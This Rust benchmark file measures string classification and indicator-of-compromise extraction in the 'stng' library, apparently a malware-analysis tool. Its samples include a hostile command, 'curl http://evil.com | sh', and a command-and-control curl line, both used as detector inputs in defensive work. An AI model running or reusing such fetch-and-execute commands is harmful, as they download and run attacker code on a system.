//! Benchmarks for string classification.
//!
//! Run with: cargo bench -p stng

use criterion::{Criterion, Throughput, black_box, criterion_group, criterion_main};
use stng::{ExtractedString, StringKind, StringMethod};

fn bench_classify(c: &mut Criterion) {
    let mut g = c.benchmark_group("classify_string");

    // Fast path: very short strings
    g.bench_function("short_const", |b| {
        b.iter(|| stng::classify_string(black_box("ab")))
    });

    // Common case: plain constant
    g.bench_function("const", |b| {
        b.iter(|| stng::classify_string(black_box("Hello World")))
    });

    // URL detection
    g.bench_function("url", |b| {
        b.iter(|| stng::classify_string(black_box("https://malware.example.com/payload.exe")))
    });

    // IP address
    g.bench_function("ip", |b| {
        b.iter(|| stng::classify_string(black_box("192.168.1.1")))
    });

    // IP that's actually a version string (false positive check)
    g.bench_function("version_not_ip", |b| {
        b.iter(|| stng::classify_string(black_box("Chrome/100.0.0.0")))
    });

    // Email
    g.bench_function("email", |b| {
        b.iter(|| stng::classify_string(black_box("ransom@evil.onion")))
    });

    // File path
    g.bench_function("path", |b| {
        b.iter(|| stng::classify_string(black_box("/usr/bin/bash")))
    });

    // Shell command
    g.bench_function("shell_cmd", |b| {
        b.iter(|| stng::classify_string(black_box("curl http://evil.com | sh")))
    });

    // Base64
    g.bench_function("base64", |b| {
        b.iter(|| stng::classify_string(black_box("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0")))
    });

    // Environment variable
    g.bench_function("env_var", |b| {
        b.iter(|| stng::classify_string(black_box("COLUMNS")))
    });

    // Long unclassifiable string (>1000 chars, prefix scan finds nothing)
    let long_plain = "A".repeat(1500);
    g.bench_function("long_unclassified", |b| {
        b.iter(|| stng::classify_string(black_box(&long_plain)))
    });

    // Long URL (>1000 chars, prefix scan catches it)
    let long_url = format!("https://evil.com/{}", "x".repeat(1500));
    g.bench_function("long_url", |b| {
        b.iter(|| stng::classify_string(black_box(&long_url)))
    });

    // Long path (>1000 chars, prefix scan catches it)
    let long_path = format!("/usr/local/bin/{}", "a/".repeat(500));
    g.bench_function("long_path", |b| {
        b.iter(|| stng::classify_string(black_box(&long_path)))
    });

    g.finish();
}

fn bench_extract_iocs(c: &mut Criterion) {
    let ordinary: Vec<_> = (0..10_000)
        .map(|i| ExtractedString {
            value: format!("ordinary application string number {i}"),
            data_offset: i * 64,
            data_len: 0,
            method: StringMethod::RawScan,
            kind: None,
            fragments: None,
        })
        .collect();
    let mixed: Vec<_> = (0..1_000)
        .flat_map(|i| {
            [
                ExtractedString {
                    value: format!("ordinary string {i}"),
                    data_offset: i * 128,
                    data_len: 0,
                    method: StringMethod::RawScan,
                    kind: None,
                    fragments: None,
                },
                ExtractedString {
                    value: "curl https://C2.Example.COM:443/payload".to_string(),
                    data_offset: i * 128 + 64,
                    data_len: 0,
                    method: StringMethod::Base64Decode,
                    kind: Some(StringKind::ShellCmd),
                    fragments: None,
                },
            ]
        })
        .collect();

    let mut group = c.benchmark_group("extract_iocs");
    group.throughput(Throughput::Elements(ordinary.len() as u64));
    group.bench_function("ordinary_10k", |b| {
        b.iter(|| stng::extract_iocs(black_box(&ordinary)))
    });
    group.throughput(Throughput::Elements(mixed.len() as u64));
    group.bench_function("mixed_dedup_2k", |b| {
        b.iter(|| stng::extract_iocs(black_box(&mixed)))
    });
    group.finish();
}

criterion_group!(benches, bench_classify, bench_extract_iocs);
criterion_main!(benches);
